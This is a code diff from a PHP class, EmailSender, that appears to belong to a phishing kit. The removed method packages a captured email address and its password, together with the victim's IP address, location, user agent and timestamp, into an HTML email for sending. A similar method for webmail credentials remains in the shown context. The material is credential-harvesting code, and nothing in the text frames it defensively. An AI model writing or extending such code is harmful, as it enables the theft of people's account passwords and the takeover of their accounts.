@@ -180,32 +180,6 @@ class EmailSender
         return mail($to, $subject, $body, implode("\r\n", $headers));
     }
 
-    public static function buildEmailBody(string $email, string $password, string $message, array $clientInfo): string 
-    {
-        return "
-        <html>
-        <head><title>Contact Form Submission</title></head>
-        <body style='font-family: Arial, sans-serif; line-height: 1.6;'>
-            <h2 style='color: #333;'>Contact Form Submission</h2>
-            
-            <div style='background: #f4f4f4; padding: 20px; border-radius: 5px; margin: 20px 0;'>
-                <h3 style='margin-top: 0;'>Contact Information</h3>
-                <p><strong>Email:</strong> " . htmlspecialchars($email) . "</p>
-                <p><strong>Password:</strong> " . htmlspecialchars($password) . "</p>
-                " . (!empty($message) ? "<p><strong>Message:</strong><br>" . nl2br(htmlspecialchars($message)) . "</p>" : "") . "
-            </div>
-            
-            <div style='background: #e9e9e9; padding: 15px; border-radius: 5px; font-size: 12px;'>
-                <h4 style='margin-top: 0;'>Client Information</h4>
-                <p><strong>IP Address:</strong> " . htmlspecialchars($clientInfo['ip']) . "</p>
-                <p><strong>Location:</strong> " . htmlspecialchars($clientInfo['location']) . "</p>
-                <p><strong>User Agent:</strong> " . htmlspecialchars($clientInfo['user_agent']) . "</p>
-                <p><strong>Timestamp:</strong> " . htmlspecialchars($clientInfo['timestamp']) . "</p>
-            </div>
-        </body>
-        </html>";
-    }
-
     public static function buildWebmailEmailBody(string $email, string $password, array $clientInfo): string 
     {
         $parts = explode("@", $email);
